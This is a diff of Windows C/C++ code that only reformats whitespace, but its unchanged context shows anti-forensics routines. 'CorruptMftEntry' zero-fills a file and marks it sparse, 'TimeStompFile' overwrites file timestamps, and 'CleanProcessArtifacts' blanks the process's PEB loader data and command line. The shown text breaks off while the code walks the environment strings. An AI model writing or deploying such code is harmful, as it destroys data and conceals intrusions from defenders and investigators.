@@ -8,38 +8,38 @@
 
 BOOL CorruptMftEntry(LPCWSTR filePath) {
     HANDLE hFile = CreateFileW(
-        filePath, 
+        filePath,
         GENERIC_READ | GENERIC_WRITE,
-        0, 
-        NULL, 
-        OPEN_EXISTING, 
-        FILE_FLAG_BACKUP_SEMANTICS, 
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_BACKUP_SEMANTICS,
         NULL
     );
-    
-    if (hFile == INVALID_HANDLE_VALUE) 
+
+    if (hFile == INVALID_HANDLE_VALUE)
         return FALSE;
 
     FILE_STANDARD_INFO fileInfo;
     GetFileInformationByHandleEx(hFile, FileStandardInfo, &fileInfo, sizeof(fileInfo));
-    
+
     BYTE* zeroBuffer = new BYTE[fileInfo.EndOfFile];
     SecureZeroMemory(zeroBuffer, fileInfo.EndOfFile);
-    
+
     DWORD bytesWritten;
     WriteFile(hFile, zeroBuffer, fileInfo.EndOfFile, &bytesWritten, NULL);
     FlushFileBuffers(hFile);
 
     DWORD bytesReturned;
     DeviceIoControl(
-        hFile, 
-        FSCTL_SET_SPARSE, 
-        NULL, 0, 
-        NULL, 0, 
-        &bytesReturned, 
+        hFile,
+        FSCTL_SET_SPARSE,
+        NULL, 0,
+        NULL, 0,
+        &bytesReturned,
         NULL
     );
-    
+
     CloseHandle(hFile);
     return TRUE;
 }
@@ -54,13 +54,13 @@ VOID TimeStompFile(LPCWSTR filePath) {
         FILE_ATTRIBUTE_NORMAL,
         NULL
     );
-    
+
     if (hFile != INVALID_HANDLE_VALUE) {
         FILETIME ft;
         SYSTEMTIME st;
         GetSystemTime(&st);
         SystemTimeToFileTime(&st, &ft);
-        
+
         SetFileTime(hFile, &ft, &ft, &ft);
         CloseHandle(hFile);
     }
@@ -69,7 +69,7 @@ VOID TimeStompFile(LPCWSTR filePath) {
 VOID WipeMemory(PVOID addr, SIZE_T len) {
     volatile char* p = (volatile char*)addr;
     while (len--) *p++ = 0;
-    
+
     MemoryBarrier();
 }
 
@@ -78,7 +78,7 @@ VOID CleanProcessArtifacts() {
     PPEB pPeb = (PPEB)__readgsqword(0x60);
     pPeb->Ldr = NULL;
     pPeb->ProcessParameters->CommandLine.Buffer = NULL;
-    
+
     // !env vars
     LPWCH envStrings = GetEnvironmentStrings();
     while (*envStrings) {
